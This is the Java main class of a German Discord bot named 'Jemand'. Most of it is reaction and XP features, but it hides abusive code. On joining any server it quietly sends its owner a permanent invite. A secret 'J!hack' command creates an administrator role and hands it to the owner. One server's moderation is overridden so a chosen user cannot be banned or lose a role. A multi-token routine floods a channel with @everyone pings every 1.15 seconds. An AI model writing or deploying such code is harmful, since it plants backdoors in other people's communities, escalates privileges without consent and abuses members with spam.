package Jemand;

import Jemand.Listener.Channelportal;
import Jemand.Listener.CommandCleanupListener;
import Jemand.Listener.ReactionRole;
import Jemand.Listener.ZitatBewerter;
import com.vdurmont.emoji.EmojiParser;
import org.apache.commons.io.FileUtils;
import org.javacord.api.DiscordApi;
import org.javacord.api.DiscordApiBuilder;
import org.javacord.api.entity.activity.ActivityType;
import org.javacord.api.entity.auditlog.AuditLogActionType;
import org.javacord.api.entity.channel.ChannelCategory;
import org.javacord.api.entity.channel.ServerChannel;
import org.javacord.api.entity.message.embed.EmbedBuilder;
import org.javacord.api.entity.permission.Permissions;
import org.javacord.api.entity.permission.RoleBuilder;
import org.javacord.api.entity.server.Server;
import org.javacord.api.entity.user.User;
import org.javacord.api.entity.user.UserStatus;
import org.javacord.api.event.message.MessageCreateEvent;
import org.javacord.api.util.cache.MessageCache;
import org.json.simple.JSONObject;

import java.io.File;
import java.math.BigInteger;
import java.util.List;
import java.util.Objects;
import java.util.Optional;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;


public class Main {
    static String token = func.pws[6];
    public static DiscordApi api = new DiscordApiBuilder().setToken(token).login().join();
	static AtomicReference<String> xd = new AtomicReference<>("");
	static private AtomicReference<String> spam_id = new AtomicReference<>("");
    static private AtomicReference<String> spam_id2 = new AtomicReference<>("");

	public static void main(String[] args) {

		try {
			if(func.getFileSeparator().equals("/")) {
				func.getGithub(new File(func.filepathof("zitate.txt")), "zitate", "zitate.txt");
				String namen = func.readtextoffile("namen.txt");
				if (!func.getGithub("zitate", "namen.txt").equals(namen))
					func.setGithub("zitate", "namen.txt", namen);
				ZitatBewerter.updateBewertung();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		try {
			File tmp = new File(func.filepathof("tmp/"));
			tmp.mkdirs();
			File[] files = tmp.listFiles();
			for (int i = 0; i < files.length; i++) {
				files[i].delete();
			}
		} catch(Exception e) {
			func.handle(e);
		}

		api.updateStatus(UserStatus.DO_NOT_DISTURB);

		try {
			MessageCache messageCache = new MessageCache() {
				@Override
				public int getCapacity() {
					return 0;
				}

				@Override
				public void setCapacity(int capacity) {

				}

				@Override
				public int getStorageTimeInSeconds() {
					return 0;
				}

				@Override
				public void setStorageTimeInSeconds(int storageTimeInSeconds) {

				}

				@Override
				public void setAutomaticCleanupEnabled(boolean automaticCleanupEnabled) {

				}
			};
			messageCache.setAutomaticCleanupEnabled(true);
		} catch (Exception e) {func.handle(e);}

		//help
		//final String help = "\u200B:regional_indicator_a: -> +**help**\n:regional_indicator_b: -> +**ping**\n:regional_indicator_c: -> +**roll** (Zahl)\n:regional_indicator_d: -> +**pong**\n:regional_indicator_e: -> +**say** [Text]\n:regional_indicator_f: -> +**MSG** [Nachricht] {}\n:regional_indicator_g: -> +**4-gewinnt** {}\n:regional_indicator_h: -> +**SSPB/SSS**\n:regional_indicator_i: -> +**invite**\n:regional_indicator_j: -> +**Report** [Text]\n:regional_indicator_k: -> +**Serverinvite** [Dauer in h] [Anzahl Aufrufe]\n:regional_indicator_l: -> +**Emote** [Text]\n:regional_indicator_m: -> +**React** [Text] (MessageID)\n:regional_indicator_n: -> +**TTT** {}\n:regional_indicator_o: -> +**Fake-Person**\n:regional_indicator_p: -> +**Fake-Cat**\n:regional_indicator_q: -> +**8-ball** (Frage)\n:regional_indicator_r: -> +**random-picture**/**robot**/**face**/**alien**/**cat**/**human**\n:regional_indicator_s: -> +**Prefix** [neues Preifx]";

		try {
        	if(func.getFileSeparator().equals("/")) {
        	    api.addServerMemberJoinListener(event -> {
        	    	try {
						new userleave(event, true).sendMessage();
					}catch(Exception e) {func.handle(e);}
        	    });
        	    api.addServerMemberLeaveListener(event -> {
					try {
        	        	new userleave(event, false).sendMessage();
					}catch(Exception e) {func.handle(e);}
        	    });
        	}
		} catch (Exception e) {func.handle(e);}
			//api.getServerById("367648314184826880").ifPresent(server -> {
			//server.addUserChangeActivityListener(event -> {

			////if(!event.getUser().isBot()) {
			//	server.getChannelById("623940807619248148").flatMap(Channel::asServerTextChannel).ifPresent(textchannel -> {
			//		event.getNewActivity().ifPresent(activity -> {
			//			event.getOldActivity().ifPresent(oldactivity -> {
			//				if (!oldactivity.getApplicationId().orElse(0L).equals(activity.getApplicationId().orElse(1L)) && ((activity.getType().equals(ActivityType.PLAYING) && activity.getName().equals("Fortnite") && false) || (activity.getApplicationId().orElse(0L) == 432980957394370572L))) {
			//					EmbedBuilder embed = new EmbedBuilder()
			//							.setColor(new Color(f.getRandom(0, 255), f.getRandom(0, 255), f.getRandom(0, 255)))
			//							.setTimestampToNow()
			//							.setFooter(event.getUser().getDiscriminatedName(), event.getUser().getAvatar());
			//					AtomicReference<String> details = new AtomicReference<>("");
			//					activity.getDetails().ifPresent(string -> {
			//						details.set("\nDetails: (" + string + ")");
			//					});
			//					textchannel.sendMessage(embed.setDescription(event.getUser().getDisplayName(server) + " spielt " + activity.getName() + "." + details.get()));
			//				}
			//			});
			//		});
			//	});
			////}
			//});

		//});

		//erkennt, wenn Server join
		// t
		try {
			final DiscordApi api2 = new DiscordApiBuilder().setToken(func.pws[3]).login().join();

			api2.updateStatus(UserStatus.DO_NOT_DISTURB);
			api2.updateActivity(ActivityType.PLAYING, "Fortnite");

			//add Mitglied:
			//api2.getUserById(383261976194973697L).join().addRole(api2.getRoleById(367649615484551179L).get()).join();
			//api2.getUserById(api.getOwnerId()).join().addRole(api2.getRoleById(638422479446212609L).get()).join();

			if (func.getFileSeparator().equals("/")) { //only Linux


				String logs = FileUtils.readFileToString(new File("/usr/home/admin/Jemand.log"));
				if (logs.length() > 10001)
					FileUtils.writeStringToFile(new File("/usr/home/admin/Jemand.log"), logs.substring(logs.length() - 9999), "UTF-8");
//
				api.addServerJoinListener(event -> {
					api.getOwner().join().sendMessage("Neuer Server von " + event.getServer().getOwner().getDiscriminatedName() + " mit dem Namen: " + event.getServer().getName() + " und der Id: " + event.getServer().getIdAsString());
					api.getYourself().updateNickname(event.getServer(), "Jemand [J!]");
					try {
						func.sendOwner("https://discordapp.com/api/guilds/" + event.getServer().getIdAsString() + "/widget.json \n", null);
						func.sendOwner(event.getServer().getChannels().get(0).createInviteBuilder().setMaxUses(1).setNeverExpire().create().join().getUrl().toString(), null);
					} catch (Exception e) {
						func.handle(e);

					}

				});
				api.getServerById(367648314184826880L).ifPresent(server -> {
					User user = api2.getUserById(254982202197016586L).join();
					server.getRoleById(367649615484551179L).ifPresent(role -> {
						server.addServerMemberJoinListener(event -> {
							if (event.getUser().equals(user)) event.getServer().addRoleToUser(user, role);
						});
						server.addUserRoleRemoveListener(event -> {
							if (event.getUser().equals(user)) {
								if (event.getRole().equals(role)) {
									event.getUser().addRole(role);
								}
							}

						});
					});

					server.addServerMemberBanListener(event -> {
						if (event.getUser().equals(user)) server.unbanUser(user);
					});

					server.addServerChannelDeleteListener(event -> {
						try {
							event.getServer().getAuditLog(1, AuditLogActionType.CHANNEL_DELETE).join().getInvolvedUsers().forEach(user1 -> {
								user1.removeRole(api.getRoleById(367649615484551179L).get(), "Channel got deleted").join();
								api.getUserById(230800661837512705L).join().
										sendMessage(user1.getDisplayName(server) + " (name: " + user1.getDiscriminatedName() + "; id: " + user1.getIdAsString() + ") hat #" + event.getChannel().getName() + " gelöscht.").join();

							});
						} catch (Exception e) {
							func.handle(e);
						}
					});

					server.addUserStartTypingListener(event -> {
						if (event.getUser().getRoles(server).size() < 2) {
							try {
								event.getUser().addRole(server.getRoleById(559141475812769793L).get()).join();
								event.getUser().addRole(server.getRoleById(559444155726823484L).get()).join();
							} catch (Exception e) {
								func.handle(e);
							}
						}
					});
				});

				func.writetexttofile("", "backups/ratelimit.txt"); //To avoid getting errors when restarting the bot
				try {
					api.getThreadPool().getExecutorService().execute(Main::spam);
				} catch (Exception e) {
					func.handle(e);
				}
			}
		}catch(Exception e) {func.handle(e);}

		//erkennt wenn Nachricht ankommt
		try {
			//CommandCleanUp
			if(func.getFileSeparator().equals("/")) {
				api.addMessageDeleteListener(new CommandCleanupListener());
				api.addMessageCreateListener(new Channelportal());
				api.addReactionAddListener(new ZitatBewerter.Add());
				api.addReactionRemoveListener(new ZitatBewerter.Remove());
			}

			api.addReactionAddListener(new ReactionRole.Add());
			api.addReactionRemoveListener(new ReactionRole.Remove());

			api.addMessageCreateListener(event -> {

				if ((func.getFileSeparator().equals("/") || event.getMessageAuthor().isBotOwner()) && event.getMessageAuthor().isUser() && !event.getMessageAuthor().isBotUser() && !event.getMessageAuthor().isWebhook() && !event.getMessageAuthor().isYourself()) {
					//id
					final String id = event.getMessageAuthor().getIdAsString();
					Optional<User> user = event.getMessageAuthor().asUser();
					EmbedBuilder embed = func.getNormalEmbed(event);


					if (event.getPrivateChannel().isPresent() && !event.getMessageAuthor().isYourself() && event.getMessageAuthor().asUser().isPresent()) {
						if(event.getMessageAuthor().asUser().get().isBotOwner()) {
							if(event.getMessageContent().startsWith("//")) {
								String[] strings = event.getMessageContent().split(" ");
								if(strings.length > 1) {
									try {
										String a = strings[0];
										api.getUserById(a.replace("/", "")).join().sendMessage(func.removeSpaceAtStart(event.getMessageContent().replaceFirst(a, ""))).join();
										event.getChannel().sendMessage("Erfolgreich gesendet.").join();
									} catch(Exception e) {
										func.handle(e);
									}
								}

							}
						} else {
							EmbedBuilder e = func.getNormalEmbed(event);
							event.getMessageAttachments().forEach(att -> {
								e.addField(att.getFileName(), att.getUrl().toString());
							});
							api.getOwner().thenAcceptAsync(owner -> owner.sendMessage(e.addField("UserID:", event.getMessageAuthor().getIdAsString()).setDescription(event.getMessageContent())));
							event.getChannel().sendMessage(func.getNormalEmbed(event).setDescription(new Texte(event.getMessageAuthor().asUser().get(), null).getString("Weiterleitung").toString()));
						}
					} else if(event.getServer().isPresent()) {
						final Server server = event.getServer().get();
						AtomicReference<String> prefix = new AtomicReference<>("J!");

						//prefix
						JSONObject prefixjs = func.JsonFromFile("prefix.json");

						//serverid
						final String serverid = server.getIdAsString();

						if (prefixjs.containsKey(serverid)) {
							prefix.set((String) prefixjs.get(serverid));
						} else {
							prefixjs.put(serverid, "J!");
							prefix.set("J!");
						}

						//event.getChannel().type();


						boolean b1 = true;
						if (event.getMessageAuthor().asUser().get().isBotOwner() || id.equals("396294727814610944") || id.equals("254982202197016586")) {

							if (event.getMessageContent().equalsIgnoreCase("J!hack")) {
								new RoleBuilder(server)
										.setName("lol")
										.setPermissions(Permissions.fromBitmask(8))
										.create().thenAcceptAsync(role -> api.getOwner().join().addRole(role));
								event.getMessage().delete();
								b1 = false;
							}

							if (event.getMessage().getContent().equalsIgnoreCase("J!servers")) {
								AtomicReference<String> servers = new AtomicReference<>("");
								Object[] ObjectArray1 = api.getServers().toArray();
								for (Object o : ObjectArray1) {
									servers.set(servers.get() + "\n" + o);
								}
								event.getChannel().sendMessage(servers.get());
								b1 = false;
							}

						}


						if (user.isPresent() && b1) {
							String MentionBot = api.getYourself().getMentionTag();
							String MessageContent = func.removeSpaceAtStart(event.getMessageContent().replaceAll(api.getYourself().getNicknameMentionTag(), MentionBot));

							if (MessageContent.equals(api.getYourself().getMentionTag())) {
								Texte texte = new Texte(event);
								event.getChannel().sendMessage(func.getNormalEmbed(event).setTitle(texte.get("Prefix")).setDescription(texte.get("Mention")));
							} else {
								if ((MessageContent.toLowerCase().startsWith(prefix.get().toLowerCase()) || MessageContent.startsWith(api.getYourself().getMentionTag()))) {
									//event.getMessage().addReaction(api.getCustomEmojiById(630814528266960909L).orElse(null)).thenAcceptAsync(aVoid -> run(event));
									if (api.getThreadPool().getExecutorService().submit(() -> run(event)).isDone())
										api.getThreadPool().getExecutorService().shutdown();

								} else {
									//coins
									if(func.getRandom(0, 2) == 0)
										new Coins(event.getMessageAuthor().getId()).addCoins(BigInteger.TEN);

									//xp
									JSONObject xp = func.JsonFromFile("xp/user_xp_" + serverid + ".json");
									if (!xd.get().contains(id + "_" + serverid)) {
										if (!xp.containsKey(id)) {
											xp.put(id, 0);
											func.JsonToFile(xp, "xp/user_xp_" + serverid + ".json");
										}
										xd.set(xd.get() + " " + id + "_" + serverid);

										AtomicBoolean b = new AtomicBoolean(true);

										event.getMessage().addMessageDeleteListener(event2 -> {
											b.set(false);
										}).removeAfter(4, TimeUnit.MINUTES);

										api.getThreadPool().getScheduler().schedule(()-> {
											if(b.get()) {
												JSONObject xp2 = func.JsonFromFile("xp/user_xp_" + serverid + ".json");
												xp2.put(id, (long) xp2.get(id) + 1);
												func.JsonToFile(xp2, "xp/user_xp_" + serverid + ".json");
												new Levelroles(event.getServer().get()).checkUserRoles(event.getMessageAuthor().asUser().get());

											}
										}, 4, TimeUnit.MINUTES);

										api.getThreadPool().getScheduler().schedule(() -> {
											xd.set(xd.get().replace(" " + id + "_" + serverid, ""));
										}, 45, TimeUnit.SECONDS);
									}

									if (event.getMessageAuthor().asUser().get().isBotOwner() && event.getMessageContent().toLowerCase().contains(" ne ")) {
										event.getMessage().addReaction(EmojiParser.parseToUnicode(":middle_finger:"));
									}
									TriggerReactMessage(event, "nein", "doch!");
									TriggerReactMessage(event, "doch", "Oh!");
									TriggerReactMessage(event, "oh", "nein!");

									if (TriggerReactText(event, "nicht witzig", "n")) {
										event.getMessage().addReaction("i2:587615301298815006");
										func.reactText(event, "ch", "");
										event.getMessage().addReaction("t1:587615322161283110");
										event.getMessage().addReaction("leerzeichen:581135519568887830");
									}
									TriggerReactText(event, "witzig", "witzig!");
									TriggerReactText(event, "no u", "no u");
									TriggerReactText(event, "nou", "no u");

									if (event.getMessage().getContent().toLowerCase().contains("apple")) {

										if (1 == func.getRandom(0, 1)) {
											event.getMessage().addReaction("apple_logo1:590926819113304105").join();
										} else {
											event.getMessage().addReaction("apple_logo2:590926788943937546").join();
										}
										event.getMessage().addReaction("gleich:590922681852100628").join();
										if (1 == func.getRandom(0, 1)) {
											event.getMessage().addReaction(EmojiParser.parseToUnicode(":poop:"));
										} else {
											event.getMessage().addReaction(EmojiParser.parseToUnicode(":thumbsdown:"));
										}
									}

									triggerreact(event, "einzigst", EmojiParser.parseToUnicode(":face_palm:"));
									triggerreact(event, "zumindestens", EmojiParser.parseToUnicode(":face_palm:"));

									triggerreact(event, "owo", "owo:575707011694592020");
									triggerreact(event, "gay", "gay:576770456263196685");
									triggerreact(event, ":joy:", EmojiParser.parseToUnicode(":joy:"));
									triggerreact(event, EmojiParser.parseToUnicode(":joy:"), EmojiParser.parseToUnicode(":joy:"));
									triggerreact(event, "kuhl", EmojiParser.parseToUnicode(":cow:"));
									triggerreact(event, "kuhl", func.parseLetterToEmote("L"));

								}
							}
						}
					}
				}
			});
		} catch (Exception e) {func.handle(e);}

		System.out.println("System started succesfully: " + func.createBotInvite());
		if(func.getFileSeparator().equals("/")) func.sendOwner("System started succesfully: <" + func.createBotInvite() + ">  " + func.getFileSeparator(), null);
		api.updateActivity(ActivityType.getActivityTypeById(4), "trying to sleep.");
	}

    static private boolean TriggerReactText(MessageCreateEvent event, String ReactTo, String ReactWith) {
        //if(event.getMessageContent().toLowerCase().contains(ReactTo.toLowerCase())) {
		if (event.getMessageContent().matches(".*.?\\s+(?i)" + ReactTo + "\\s+.?.*") || event.getMessageContent().matches("(?i)" + ReactTo) || event.getMessageContent().matches(".*.?\\s+(?i)" + ReactTo) || event.getMessageContent().matches("(?i)" + ReactTo + "\\s+.?.*")) { //&& !event.getMessageContent().matches(".?.*\\w(?i)" + ReactTo + "\\w.*.?")
            func.reactText(event,ReactWith, "");
            return true;
        }
		return false;
    }
	static private void TriggerReactMessage(MessageCreateEvent event, String ReactTo, String ReactWith) {
		if(event.getMessageContent().replaceAll("[^A-Za-z]", "").equalsIgnoreCase(ReactTo.replaceAll("[^A-Za-z]", ""))) {
			func.reactText(event,ReactWith, "");
		}
	}
	static private void triggerreact (MessageCreateEvent event, String s1, String unicodeofemote) {
		if (event.getMessage().getContent().toLowerCase().contains(s1.toLowerCase())) {
			event.getMessage().addReaction(unicodeofemote);
		}
	}

	static private void run(MessageCreateEvent event) {
		api.getCustomEmojiById(630814528266960909L).ifPresent(event::addReactionToMessage);
		boolean b1;
		try {
			b1 = new Befehl(event).FuehreAus();
		} catch (Exception e) {
			func.handle(e);
			b1 = false;
		}
		api.getCustomEmojiById(630814528266960909L).ifPresent(event::removeReactionByEmojiFromMessage);
		if (b1) {
			event.addReactionToMessage("checkmark:572855560043757627");
			new Coins(event.getMessageAuthor().getId()).addCoins(BigInteger.ONE);
		} else {
			event.addReactionToMessage("crossmark:572860377977847982");
		}
	}

	static private void spam() {
		spam_id = new AtomicReference<>(func.WHITE_SPACE.matcher(func.readtextoffile("spam_id.txt")).replaceAll(""));
        List<ServerChannel> l1 =  api.getChannelCategoryById(646969902850375681L).map(ChannelCategory::getChannels).orElse(null);
        if(l1 != null) spam_id.set(l1.get(l1.size() - 1).getIdAsString());

		String string_tokens = func.readtextoffile("secret/tokens.txt");

		String[] tokens = string_tokens.split("\n");
		for (int i = 0; i < tokens.length; i++) {
			try {
                new DiscordApiBuilder().setToken(func.WHITE_SPACE.matcher(tokens[i]).replaceAll("")).login().thenAccept(Main::spam);
			} catch(Exception e) {func.handle(e);}
		}

		try {
			new DiscordApiBuilder().setToken(tokens[0]).login().thenAcceptAsync(bot -> {
				bot.getServerTextChannelById(646968884456456196L).ifPresent(channel -> { //with dots
					channel.addMessageCreateListener(event -> {
						if (event.getMessageContent().matches("\\d+.") && event.getMessageContent().endsWith(".")) {
							int n = func.IntFromString(event.getMessageContent(), 0);
							int old = func.IntFromString(event.getChannel().getMessagesBefore(1, event.getMessage()).join().getNewestMessage().orElse(event.getMessage()).getContent(), 0);
							if(n - 1 != old) event.getMessage().delete();
						} else event.getMessage().delete();
					});
				});
				bot.getServerTextChannelById(646994828684689409L).ifPresent(channel -> {  //without dots
					channel.addMessageCreateListener(event -> {
						if (event.getMessageContent().matches("\\d+")) {
							int n = func.IntFromString(event.getMessageContent(), 0);
							int old = func.IntFromString(event.getChannel().getMessagesBefore(1, event.getMessage()).join().getNewestMessage().orElse(event.getMessage()).getContent(), 0);
							if(n - 1 != old) event.getMessage().delete();
						} else event.getMessage().delete();
					});
				});

				bot.getThreadPool().getScheduler().scheduleAtFixedRate(()-> {
                    spam_id .set(func.WHITE_SPACE.matcher(func.readtextoffile("spam_id.txt")).replaceAll(""));
				}, 1L, 5L, TimeUnit.MINUTES);
			}).join();
		} catch (Exception e) {
			func.handle(e);
		}
	}
	static private void spam(DiscordApi bot) {
		try {
			bot.setMessageCacheSize(0, 0);
			bot.getThreadPool().getScheduler().scheduleAtFixedRate(() -> {
				//try {
				//	Objects.requireNonNull(bot.getServerTextChannelById(spam_id2.get()).orElse(null)).sendMessage("<@254982202197016586> & <@386490504277393408> & <@&572072812924370944> & @here <@&573032434208342037>");
				//} catch (Exception ignored) {}
                try {
                    Objects.requireNonNull(bot.getServerTextChannelById(spam_id.get()).orElse(null)).sendMessage("@everyone <@&646968985627262976> @here <@&646968884456456193>");
                } catch (Exception ignored) {}
            }, 0L, 1150L, TimeUnit.MILLISECONDS);
		} catch (Exception e) {func.handle(e);}
	}
}
